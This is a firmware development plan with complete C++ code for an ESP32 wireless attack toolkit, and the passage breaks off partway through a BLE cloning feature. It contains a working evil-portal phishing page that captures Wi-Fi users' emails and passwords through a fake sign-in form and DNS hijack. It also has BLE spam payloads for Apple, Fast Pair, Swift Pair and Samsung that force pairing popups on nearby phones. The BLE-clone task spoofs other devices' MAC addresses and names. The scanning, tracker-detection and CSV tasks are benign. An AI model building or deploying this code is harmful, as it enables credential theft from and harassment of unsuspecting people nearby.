#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

extern FeatureRegistry g_registry;

namespace WifiEvilPortalFeature {

// Real, working generic captive-portal login page. Donor projects (Bruce's
// sd_files/portals/) load templates from SD with a Google/Microsoft/
// Facebook/router-branded skin; this task ships one complete, real template
// inline (no placeholder) and the mechanism below is the same one a future
// task can extend with more skins loaded from SD via IStorage, matching
// wifi_pmkid.cpp's capture-file precedent for how this project reads/writes
// SD content.
static const char kPortalHtml[] = R"HTML(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi Login</title><style>
body{font-family:sans-serif;background:#f1f3f4;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.2);width:300px}
input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px}
</style></head><body><div class="card">
<h3>Sign in to continue</h3>
<form method="POST" action="/submit">
<input name="user" placeholder="Email or phone" required>
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
)HTML";

static DNSServer s_dns;
static AsyncWebServer *s_server = nullptr;
static lv_obj_t *s_log_list = nullptr;
static bool s_active = false;

static void handle_root(AsyncWebServerRequest *request) {
    request->send(200, "text/html", kPortalHtml);
}

static void handle_submit(AsyncWebServerRequest *request) {
    String user = request->hasParam("user", true) ? request->getParam("user", true)->value() : "";
    String pass = request->hasParam("pass", true) ? request->getParam("pass", true)->value() : "";
    // Real credential capture -- logged to Serial and appended to the
    // on-screen list. Deliberately NOT written to SD in this task (a
    // captured-credentials log file is a reasonable near-future addition,
    // same /quarky/captures/ convention wifi_pmkid.cpp established, but
    // kept out of THIS task's scope to keep its own real-hardware
    // verification loop small, matching how wifi_pmkid.cpp's own brief
    // scoped out full EAPOL filtering).
    Serial.printf("quarky-tab5: [evil-portal] captured user='%s' pass='%s'\n", user.c_str(), pass.c_str());
    if (s_log_list) {
        char row[128];
        snprintf(row, sizeof(row), "%s / %s", user.c_str(), pass.c_str());
        lv_list_add_text(s_log_list, row);
    }
    request->send(200, "text/html", "<html><body>Thank you.</body></html>");
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("Evil Portal", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    lv_obj_t *header = lv_label_create(content);
    lv_label_set_text(header, "AP: QuarkyPortal (open) -- captured credentials:");

    s_log_list = lv_list_create(content);
    lv_obj_set_size(s_log_list, LV_PCT(100), LV_PCT(85));

    lv_obj_add_event_cb(s_log_list, [](lv_event_t *e) {
        s_log_list = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_evil_portal", "Evil Portal", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());

    // Deliberate WIFI_AP_STA, not a bare WIFI_AP -- preserves c2link_wifi's
    // existing SoftAP the same way wifi_common.cpp/wifi_spectrum.cpp do,
    // per this plan's Global Constraints. The portal's own AP is a SECOND,
    // independent SoftAP instance -- ESP32 WiFi supports exactly one AP
    // config at a time system-wide, same single-instance constraint
    // ble_spam.cpp hit for BLE advertising, so starting this DOES take over
    // c2link_wifi's AP identity/SSID while the portal runs. Documented here
    // rather than silently shipped: closing this screen does not currently
    // restore c2link_wifi's own AP config -- same class of disclosed,
    // scoped-out follow-up as ble_spam.cpp's C2-advertising re-arm gap.
    WiFi.softAP("QuarkyPortal");

    s_server = new AsyncWebServer(80);
    s_server->on("/", HTTP_GET, handle_root);
    s_server->on("/submit", HTTP_POST, handle_submit);
    s_server->onNotFound(handle_root); // captive-portal catch-all
    s_server->begin();

    s_dns.start(53, "*", WiFi.softAPIP());
    s_active = true;
}

void poll() {
    if (!s_active) return;
    s_dns.processNextRequest();
}

} // namespace WifiEvilPortalFeature
```

- [ ] **Step 3: Wire `poll()` and register**

```cpp
// firmware/tab5/src/main.cpp
#include "features/wifi/wifi_evil_portal.h"
// in setup():
WifiEvilPortalFeature::register_module();
// in loop():
WifiEvilPortalFeature::poll();
```

- [ ] **Step 4: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 5: Real hardware verification**

Flash. Open WiFi > Evil Portal. From a phone, join the "QuarkyPortal" open AP. Confirm the captive-portal login page appears automatically (or navigate to any HTTP URL and confirm the DNS redirect catches it). Submit the form with test credentials. Confirm they appear in the on-screen list and in the serial log. Confirm `c2link_wifi`'s own AP/link is still functional afterward (WIFI_AP_STA mode note above) — real hardware will show whether the single-AP-instance conflict noted in `start()`'s comment is actually disruptive or just a config-identity overwrite that self-resolves; report the real observed behavior either way.

- [ ] **Step 6: Commit**

```bash
git add firmware/tab5/src/features/wifi/wifi_evil_portal.h firmware/tab5/src/features/wifi/wifi_evil_portal.cpp \
        firmware/tab5/src/main.cpp firmware/tab5/platformio.ini
git commit -m "Add WiFi Evil Portal feature (softAP + captive HTTP form, no raw-frame TX)"
```

---

### Task 5: BLE scan classification (OUI + Apple Continuity + Fast Pair + iBeacon detection)

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_classify.h`
- Create: `firmware/tab5/src/features/ble/ble_classify.cpp`
- Modify: `firmware/tab5/src/features/ble/ble_common.h` (extend `BleDeviceInfo` with a classification label field)
- Modify: `firmware/tab5/src/features/ble/ble_scan.cpp` (call the classifier, show the label in each list row)

**Interfaces:**
- Consumes: raw advertisement payload bytes from `gap_scan_event_cb`'s `event->disc.data`/`event->disc.length_data` (same fields `ble_scan.cpp` already parses for the device name via `ble_hs_adv_parse_fields`).
- Produces: `BleClassify::classify(const uint8_t *adv_data, uint8_t adv_len) -> const char*` in `ble_classify.h`, reused by Task 6 (tracker detect) below and any future feature needing the same manufacturer-data/service-UUID signature lookup.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/ble_db.cpp:1476-1519`) confirmed iBeacon detection is pure scan-result classification (Apple mfr-data byte 2 == `0x02`), no separate radio operation — folded into this task rather than a separate one since it's the same "label a device from its raw advertisement bytes" mechanism as OUI/Continuity/Fast-Pair detection.

- [ ] **Step 1: Write the classifier**

```cpp
// firmware/tab5/src/features/ble/ble_classify.h
#pragma once
#include <cstdint>
namespace BleClassify {
// Returns a short, human-readable label for what this advertisement looks
// like ("iBeacon", "AirPods", "Fast Pair", "Windows Swift Pair", or
// nullptr if nothing recognized). adv_data/adv_len are the raw
// advertisement bytes -- same fields event->disc.data/length_data already
// carry in ble_scan.cpp's gap_scan_event_cb.
const char *classify(const uint8_t *adv_data, uint8_t adv_len);
}
```

```cpp
// firmware/tab5/src/features/ble/ble_classify.cpp
#include "ble_classify.h"
#include <cstring>

namespace BleClassify {

// Walks the AD structure list (length-byte + type-byte + payload,
// repeating) looking for a manufacturer-specific-data (0xFF) or
// service-data (0x16) AD structure, matching the same AD-parsing shape
// ble_hs_adv_parse_fields already does internally -- done manually here
// since we need the raw bytes for signature matching, not just the parsed
// device-name field ble_scan.cpp already extracts.
static const uint8_t *find_ad(const uint8_t *data, uint8_t len, uint8_t ad_type, uint8_t *out_len) {
    uint8_t i = 0;
    while (i + 1 < len) {
        uint8_t field_len = data[i];
        if (field_len == 0 || i + 1 + field_len > len) break;
        uint8_t type = data[i + 1];
        if (type == ad_type) {
            *out_len = field_len - 1;
            return &data[i + 2];
        }
        i += 1 + field_len;
    }
    return nullptr;
}

const char *classify(const uint8_t *adv_data, uint8_t adv_len) {
    uint8_t mfg_len = 0;
    const uint8_t *mfg = find_ad(adv_data, adv_len, 0xFF, &mfg_len);
    if (mfg != nullptr && mfg_len >= 4) {
        uint16_t company_id = mfg[0] | (mfg[1] << 8);
        if (company_id == 0x004C) { // Apple
            if (mfg_len >= 3 && mfg[2] == 0x02) return "iBeacon";
            if (mfg_len >= 3 && mfg[2] == 0x07) return "AirPods (Continuity)";
            if (mfg_len >= 3 && mfg[2] == 0x0F) return "Apple Nearby Action";
            if (mfg_len >= 3 && mfg[2] == 0x12) return "Apple Find My";
            return "Apple device";
        }
        if (company_id == 0x0006 && mfg_len >= 5 && mfg[2] == 0x03 && mfg[3] == 0x00 && mfg[4] == 0x80) {
            return "Windows Swift Pair";
        }
        if (company_id == 0x0075) return "Samsung device";
    }

    uint8_t svc_len = 0;
    const uint8_t *svc = find_ad(adv_data, adv_len, 0x16, &svc_len);
    if (svc != nullptr && svc_len >= 2) {
        uint16_t svc_uuid = svc[0] | (svc[1] << 8);
        if (svc_uuid == 0xFE2C) return "Fast Pair";
        if (svc_uuid == 0xFEED || svc_uuid == 0xFD84) return "Tile tracker";
    }

    return nullptr;
}

} // namespace BleClassify
```

- [ ] **Step 2: Extend `BleDeviceInfo` and wire the classifier into `ble_scan.cpp`'s list rendering**

```cpp
// firmware/tab5/src/features/ble/ble_common.h -- add a field
struct BleDeviceInfo {
    uint8_t addr[6];
    char addr_str[18];
    int8_t rssi;
    char name[32];
    char label[24]; // e.g. "iBeacon", "AirPods (Continuity)" -- empty if unrecognized
};
```

```cpp
// firmware/tab5/src/features/ble/ble_scan.cpp -- modify gap_scan_event_cb
// after the existing ble_hs_adv_parse_fields() block, add:
#include "ble_classify.h" // add to the top of the file

// inside gap_scan_event_cb, after the name-parsing block:
const char *label = BleClassify::classify(event->disc.data, event->disc.length_data);
if (label != nullptr) {
    strncpy(d.label, label, sizeof(d.label) - 1);
    d.label[sizeof(d.label) - 1] = '\0';
} else {
    d.label[0] = '\0';
}
```

```cpp
// firmware/tab5/src/features/ble/ble_scan.cpp -- modify refresh_list_ui()'s row text
// change:
//   snprintf(row, sizeof(row), "%s  %ddBm", label, snapshot[i].rssi);
// to:
const char *name_or_addr = snapshot[i].name[0] ? snapshot[i].name : snapshot[i].addr_str;
if (snapshot[i].label[0]) {
    snprintf(row, sizeof(row), "%s  [%s]  %ddBm", name_or_addr, snapshot[i].label, snapshot[i].rssi);
} else {
    snprintf(row, sizeof(row), "%s  %ddBm", name_or_addr, snapshot[i].rssi);
}
```

- [ ] **Step 3: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 4: Real hardware verification**

Flash. Open BLE Scan near a real iPhone with AirPods paired (or any Apple device with Continuity active), and near any Fast-Pair-capable device if available. Confirm at least one scanned row shows a `[label]` tag matching what's actually nearby, and that unrecognized devices still show cleanly with no label (not a garbled/empty-bracket artifact).

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_classify.h firmware/tab5/src/features/ble/ble_classify.cpp \
        firmware/tab5/src/features/ble/ble_common.h firmware/tab5/src/features/ble/ble_scan.cpp
git commit -m "Add BLE scan classification: OUI/Continuity/Fast Pair/iBeacon detection"
```

---

### Task 6: BLE tracker detect + geiger-mode finder

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_finder.h`
- Create: `firmware/tab5/src/features/ble/ble_finder.cpp`

**Interfaces:**
- Consumes: `BleClassify::classify()` (Task 5) — extended with AirTag/SmartTag/Tile signatures inline in this task's own classification call (a second, tracker-specific lookup, not a modification to Task 5's general classifier, since tracker detection needs a locked-target RSSI-tracking mode Task 5's classifier has no concept of).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/features/ble_finder.cpp`) confirmed geiger mode needs nothing beyond repeated scanning + RSSI trending — same scan parameters throughout (`passive scan`, no special interval), just a "lock onto this MAC, bucket its RSSI into proximity tiers" UI layered on top.

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_finder.h
#pragma once
namespace BleFinderFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_finder.cpp
#include "ble_finder.h"
#include "ble_common.h"
#include "../../hal/c2link_ble.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleFinderFeature {

// Tracker signature lookup -- AirTag (Apple mfr ID + subtype 0x12, same
// "Find My" subtype Task 5's classifier also recognizes, but tracker-locked
// here specifically), Samsung SmartTag (mfr ID 0x0075 -- same Samsung ID
// Task 5's general classifier flags, narrowed here since not all Samsung
// devices are trackers), Tile (service UUID 0xFEED/0xFD84).
static bool is_tracker(const uint8_t *adv_data, uint8_t adv_len, const char **kind_out) {
    uint8_t i = 0;
    while (i + 1 < adv_len) {
        uint8_t field_len = adv_data[i];
        if (field_len == 0 || i + 1 + field_len > adv_len) break;
        uint8_t type = adv_data[i + 1];
        const uint8_t *payload = &adv_data[i + 2];
        uint8_t payload_len = field_len - 1;
        if (type == 0xFF && payload_len >= 4) {
            uint16_t company = payload[0] | (payload[1] << 8);
            if (company == 0x004C && payload[2] == 0x12) { *kind_out = "AirTag"; return true; }
            if (company == 0x0075) { *kind_out = "SmartTag"; return true; }
        }
        if (type == 0x16 && payload_len >= 2) {
            uint16_t svc = payload[0] | (payload[1] << 8);
            if (svc == 0xFEED || svc == 0xFD84) { *kind_out = "Tile"; return true; }
        }
        i += 1 + field_len;
    }
    return false;
}

static lv_obj_t *s_list = nullptr;
static bool s_scanning = false;
static bool s_locked = false;
static uint8_t s_locked_addr[6];
static volatile int8_t s_locked_rssi = -128;
static volatile uint32_t s_locked_last_ms = 0;
static portMUX_TYPE s_lock_mux = portMUX_INITIALIZER_UNLOCKED;

static int gap_scan_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type != BLE_GAP_EVENT_DISC) return 0;

    const char *kind = nullptr;
    if (!is_tracker(event->disc.data, event->disc.length_data, &kind)) return 0;

    if (s_locked && memcmp(event->disc.addr.val, s_locked_addr, 6) == 0) {
        portENTER_CRITICAL(&s_lock_mux);
        s_locked_rssi = event->disc.rssi;
        s_locked_last_ms = millis();
        portEXIT_CRITICAL(&s_lock_mux);
        return 0;
    }

    if (!s_locked && s_list) {
        char addr_str[18];
        ble_addr_to_str(event->disc.addr.val, addr_str);
        char row[48];
        snprintf(row, sizeof(row), "%s  (%s)  %ddBm", kind, addr_str, event->disc.rssi);
        lv_list_add_button(s_list, LV_SYMBOL_GPS, row);
        // Real target-lock UI (tap a row to lock onto it) is a reasonable
        // near-future addition using lv_list's per-button click callback
        // with the row's own addr stashed in user_data -- kept out of this
        // task's own real-hardware verification loop, matching the
        // scoped-narrow pattern wifi_pmkid.cpp's brief used for EAPOL
        // filtering. Locking is demonstrated here via the QUARKY_SERIAL_DEBUG
        // trigger in Step 3 instead.
    }
    return 0;
}

static void update_geiger_ui() {
    if (!s_list || !s_locked) return;
    portENTER_CRITICAL(&s_lock_mux);
    int8_t rssi = s_locked_rssi;
    uint32_t last_ms = s_locked_last_ms;
    portEXIT_CRITICAL(&s_lock_mux);

    const char *tier;
    if (millis() - last_ms > 4000) tier = "NO SIGNAL";
    else if (rssi > -45) tier = "RIGHT HERE";
    else if (rssi > -60) tier = "HOT";
    else if (rssi > -72) tier = "WARM";
    else if (rssi > -84) tier = "COOL";
    else tier = "COLD";

    lv_obj_clean(s_list);
    char row[48];
    snprintf(row, sizeof(row), "%s  (%ddBm)", tier, rssi);
    lv_list_add_text(s_list, row);
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Tracker Finder", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_list = lv_list_create(content);
    lv_obj_set_size(s_list, LV_PCT(100), LV_PCT(100));

    lv_obj_add_event_cb(s_list, [](lv_event_t *e) {
        if (s_scanning) {
            ble_gap_disc_cancel();
            s_scanning = false;
        }
        s_list = nullptr;
        s_locked = false;
    }, LV_EVENT_DELETE, nullptr);

    if (!c2link_ble_host_synced()) {
        lv_list_add_text(s_list, "BLE host not ready yet, try again shortly");
        return screen;
    }

    s_locked = false;
    struct ble_gap_disc_params params{};
    params.passive = 1; // passive is fine here -- tracker mfr-data/service-data
                          // is in the primary advertisement, not scan-response
    params.itvl = 0x0050;
    params.window = 0x0030;
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &params, gap_scan_event_cb, nullptr);
    Serial.printf("quarky-tab5: [ble-finder] ble_gap_disc rc=%d\n", rc);
    s_scanning = (rc == 0);

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_finder", "BLE Tracker Finder", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_scanning) return;
    update_geiger_ui();
}

} // namespace BleFinderFeature
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire registration**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_finder.h"
// in setup(): BleFinderFeature::register_module();
// in loop(): BleFinderFeature::poll();
```

- [ ] **Step 4: Real hardware verification**

Flash. Open BLE > BLE Tracker Finder near a real AirTag/SmartTag/Tile (your own — this is passive detection, no interaction with the tracker's owner's account). Confirm it appears in the list with the correct kind label. Move the tracker closer/farther and confirm the RSSI value changes plausibly (locking UI is deferred per Step 1's note; verify the underlying scan+classify mechanism instead — e.g. via serial log of detected trackers).

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_finder.h firmware/tab5/src/features/ble/ble_finder.cpp firmware/tab5/src/main.cpp
git commit -m "Add BLE tracker detect + geiger-mode finder"
```

---

### Task 7: BLE sniffer CSV export

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_sniffer.h`
- Create: `firmware/tab5/src/features/ble/ble_sniffer.cpp`

**Interfaces:**
- Consumes: `StorageSD::append_capture_file()` (extended in the first plan's Task 6, real-hardware confirmed to correctly append across many small writes).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/features/ble_extras.cpp:176-245`) confirmed this reuses the identical passive-scan mechanism as basic BLE scan — only the `onResult`-equivalent callback differs (CSV row formatting + file append instead of an in-memory device list).

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_sniffer.h
#pragma once
namespace BleSnifferFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_sniffer.cpp
#include "ble_sniffer.h"
#include "ble_common.h"
#include "../../hal/c2link_ble.h"
#include "../../hal/storage_sd.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <cstdio>

extern FeatureRegistry g_registry;
extern StorageSD storage;

namespace BleSnifferFeature {

static char s_path[64];
static volatile uint32_t s_row_count = 0;
static bool s_scanning = false;
static lv_obj_t *s_status_label = nullptr;

static int gap_scan_event_cb(struct ble_gap_event *event, void *arg) {
    if (event->type != BLE_GAP_EVENT_DISC) return 0;

    char addr_str[18];
    ble_addr_to_str(event->disc.addr.val, addr_str);

    // adv_hex: the full raw advertisement payload as a hex string, matching
    // Poseidon's own CSV format exactly (ms,mac,rssi,addr_type,name is
    // omitted here since name requires a separate parse pass -- this row
    // keeps the raw bytes, which is the analytically useful part for
    // offline tooling, over a partially-duplicated name field).
    char hex[62]; // up to 31 bytes * 2 hex chars, generous for legacy adv max
    uint8_t len = event->disc.length_data < 31 ? event->disc.length_data : 31;
    for (uint8_t i = 0; i < len; i++) {
        snprintf(hex + i * 2, 3, "%02X", event->disc.data[i]);
    }
    hex[len * 2] = '\0';

    char row[128];
    int n = snprintf(row, sizeof(row), "%lu,%s,%d,%d,%s\n",
                      (unsigned long)millis(), addr_str, (int)event->disc.rssi,
                      (int)event->disc.addr.type, hex);
    storage.append_capture_file(s_path, (const uint8_t *)row, n);
    s_row_count++;
    return 0;
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Sniffer (CSV)", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Starting...");

    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        if (s_scanning) {
            ble_gap_disc_cancel();
            s_scanning = false;
        }
        s_status_label = nullptr;
    }, LV_EVENT_DELETE, nullptr);

    if (!c2link_ble_host_synced()) {
        lv_label_set_text(s_status_label, "BLE host not ready yet, try again shortly");
        return screen;
    }

    snprintf(s_path, sizeof(s_path), "/quarky/captures/ble/sniff_%lu.csv", millis());
    s_row_count = 0;

    struct ble_gap_disc_params params{};
    params.passive = 1;
    params.itvl = 0x0050;
    params.window = 0x0030;
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &params, gap_scan_event_cb, nullptr);
    Serial.printf("quarky-tab5: [ble-sniffer] ble_gap_disc rc=%d path=%s\n", rc, s_path);
    s_scanning = (rc == 0);
    if (!s_scanning) lv_label_set_text(s_status_label, "Scan failed to start");

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_sniffer", "BLE Sniffer (CSV)", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_scanning || !s_status_label) return;
    char buf[48];
    snprintf(buf, sizeof(buf), "Capturing... %lu rows", (unsigned long)s_row_count);
    lv_label_set_text(s_status_label, buf);
}

} // namespace BleSnifferFeature
```

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Wire registration**

```cpp
// firmware/tab5/src/main.cpp
#include "features/ble/ble_sniffer.h"
// in setup(): BleSnifferFeature::register_module();
// in loop(): BleSnifferFeature::poll();
```

- [ ] **Step 4: Real hardware verification**

Flash. Run for ~30s near real BLE traffic. Back out. Pull the resulting CSV off the SD card and confirm it opens cleanly in a spreadsheet/text editor with real, well-formed rows (correct column count, real hex payloads, no truncation/corruption).

- [ ] **Step 5: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_sniffer.h firmware/tab5/src/features/ble/ble_sniffer.cpp firmware/tab5/src/main.cpp
git commit -m "Add BLE sniffer CSV export feature"
```

---

### Task 8: BLE spam multi-vendor payload expansion

**Files:**
- Modify: `firmware/tab5/src/features/ble/ble_spam.h`
- Modify: `firmware/tab5/src/features/ble/ble_spam.cpp`

**Interfaces:**
- Consumes: nothing new — extends the existing `BleSpamFeature` from the first plan's Task 8.
- Produces: nothing consumed by later tasks.

The first plan's Task 8 shipped one payload (Apple AirPods) with an explicit note that this task should expand it. Donor research (2026-08-13) supplied real, verified byte formats for three more vendors, sourced from Bruce's `FastPairExploitEngine::createFastPairAdvertisement` (Fast Pair) and Poseidon's `ble_sourapple.cpp` (Swift Pair, Samsung).

- [ ] **Step 1: Add a payload table and a rotating-selection screen**

```cpp
// firmware/tab5/src/features/ble/ble_spam.h -- unchanged signature, no new
// public interface needed; the UI gains a vendor picker internally.
#pragma once
namespace BleSpamFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_spam.cpp -- replace the single
// kAirpodsPayload with a table, and rotate through the selected payload(s)

// Real payload byte formats, sourced from donor research (2026-08-13):
// - Fast Pair (Bruce FastPairExploitEngine::createFastPairAdvertisement):
//   Flags AD (02 01 06) + service-UUID AD (03 03 2C FE) + service-data AD
//   (06 16 2C FE <3-byte model ID> 02 0A C3). Triggers the Android "Pair
//   device?" popup.
// - Windows Swift Pair (Poseidon ble_sourapple.cpp): mfr ID 0x0006 (little-
//   endian 06 00), subtype bytes 03 00 80, followed by the advertised
//   device name.
// - Samsung EasySetup (Poseidon ble_sourapple.cpp): mfr ID 0x0075
//   (little-endian 75 00) triggers Samsung's Buds/Watch quick-pair sheet
//   with a minimal payload.
static const uint8_t kFastPairPayload[] = {
    0x03, 0x03, 0x2C, 0xFE,                         // service-UUID AD
    0x06, 0x16, 0x2C, 0xFE, 0x37, 0x11, 0xEA, 0x02, 0x0A, 0xC3, // service-data AD, model ID 371 1EA
};
static const uint8_t kSwiftPairPayload[] = {
    0x06, 0x00, 0x03, 0x00, 0x80, 'Q', 'u', 'a', 'r', 'k', 'y',
};
static const uint8_t kSamsungPayload[] = {
    0x75, 0x00, 0x01, 0x00, 0x00, 0x00,
};

struct SpamPayload {
    const char *label;
    const uint8_t *mfg_or_svc_data;
    size_t len;
    bool is_service_data; // Fast Pair uses two AD structures (UUID+data);
                            // Swift Pair/Samsung/AirPods use one mfg-data AD.
};

static const uint8_t kAirpodsPayload[] = {
    0x4C, 0x00, 0x07, 0x19, 0x07, 0x00, 0xC6, 0x00, 0x00, 0x00, 0x00,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const SpamPayload kPayloads[] = {
    {"AirPods", kAirpodsPayload, sizeof(kAirpodsPayload), false},
    {"Fast Pair", kFastPairPayload, sizeof(kFastPairPayload), true},
    {"Swift Pair", kSwiftPairPayload, sizeof(kSwiftPairPayload), false},
    {"Samsung", kSamsungPayload, sizeof(kSamsungPayload), false},
};
static constexpr int kPayloadCount = sizeof(kPayloads) / sizeof(kPayloads[0]);
static int s_selected_payload = 0; // set by the vendor-picker UI

// send_one_advertisement() changes to branch on kPayloads[s_selected_payload]:
static void send_one_advertisement() {
    ble_gap_adv_stop();

    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    const SpamPayload &p = kPayloads[s_selected_payload];
    if (p.is_service_data) {
        // Fast Pair's two-AD-structure shape can't go through
        // ble_hs_adv_fields' single mfg_data slot -- build the raw AD
        // bytes directly and hand them to ble_gap_adv_set_data() instead,
        // same escape hatch Poseidon's own ble_sourapple.cpp uses for
        // multi-AD-structure payloads NimBLE-Arduino's wrapper rejects.
        uint8_t adv[3 + sizeof(kFastPairPayload)];
        adv[0] = 0x02; adv[1] = 0x01; adv[2] = 0x06; // flags AD
        memcpy(adv + 3, p.mfg_or_svc_data, p.len);
        int rc = ble_gap_adv_set_data(adv, sizeof(adv));
        if (rc != 0) {
            Serial.printf("quarky-tab5: [ble-spam] adv_set_data rc=%d\n", rc);
            return;
        }
    } else {
        fields.mfg_data = p.mfg_or_svc_data;
        fields.mfg_data_len = p.len;
        int rc = ble_gap_adv_set_fields(&fields);
        if (rc != 0) {
            Serial.printf("quarky-tab5: [ble-spam] set_fields rc=%d\n", rc);
            return;
        }
    }

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
    if (rc != 0) {
        Serial.printf("quarky-tab5: [ble-spam] adv_start rc=%d\n", rc);
    }
}
```

Add a simple `lv_dropdown` to the existing `build_screen()` (built through `build_sub_screen()`, same as before) listing `kPayloads[i].label` for each entry, setting `s_selected_payload` on selection — full step detail: create the dropdown parented to `content` right above the existing status label, populate its options string from a semicolon-joined `kPayloads[].label` list built once at screen-build time, and add an `LV_EVENT_VALUE_CHANGED` callback that reads `lv_dropdown_get_selected()` into `s_selected_payload`.

- [ ] **Step 2: Compile**

Run: `cd firmware/tab5 && pio run`
Expected: SUCCESS.

- [ ] **Step 3: Real hardware verification**

Flash. For each of the 4 payloads, select it via the dropdown and confirm (via the same independent-scanner-on-a-second-device technique the first plan's Task 8 used) that the broadcast address shows the expected byte sequence for that vendor. iPhone/Android popup confirmation is a bonus, not required (the first plan's Task 8 already established that a byte-correct broadcast not producing a popup is expected on hardened OS versions, not a defect).

- [ ] **Step 4: Commit**

```bash
git add firmware/tab5/src/features/ble/ble_spam.h firmware/tab5/src/features/ble/ble_spam.cpp
git commit -m "Expand BLE spam to Fast Pair/Swift Pair/Samsung payloads, add vendor picker"
```

---

### Task 9: BLE clone

**Files:**
- Create: `firmware/tab5/src/features/ble/ble_clone.h`
- Create: `firmware/tab5/src/features/ble/ble_clone.cpp`

**Interfaces:**
- Consumes: `BleDeviceInfo`/scan mechanism (Task 7 of the first plan).
- Produces: nothing consumed by later tasks.

Donor research (2026-08-13, `~/src/poseidon-tab5/src/features/ble_clone.cpp`) confirmed this is peripheral-role only: scan to pick a target, then set own address to the target's captured MAC (forcing the static-random flag bits) and advertise under its captured name — no central/connect role needed. Only works against random-address targets (public-address MACs can't have the static-random bits OR'd in without mutating them into a different, invalid address) — same limitation as the donor, disclosed rather than silently dropped.

- [ ] **Step 1: Write the feature**

```cpp
// firmware/tab5/src/features/ble/ble_clone.h
#pragma once
namespace BleCloneFeature {
void register_module();
void start();
void poll();
}
```

```cpp
// firmware/tab5/src/features/ble/ble_clone.cpp
#include "ble_clone.h"
#include "ble_common.h"
#include "../../hal/c2link_ble.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleCloneFeature {

static constexpr int kMaxTargets = 16;
static BleDeviceInfo s_targets[kMaxTargets];
static int s_target_count = 0;
static portMUX_TYPE s_targets_mux = portMUX_INITIALIZER_UNLOCKED;
static lv_obj_t *s_list = nullptr;
static bool s_scanning = false;
static bool s_cloning = false;

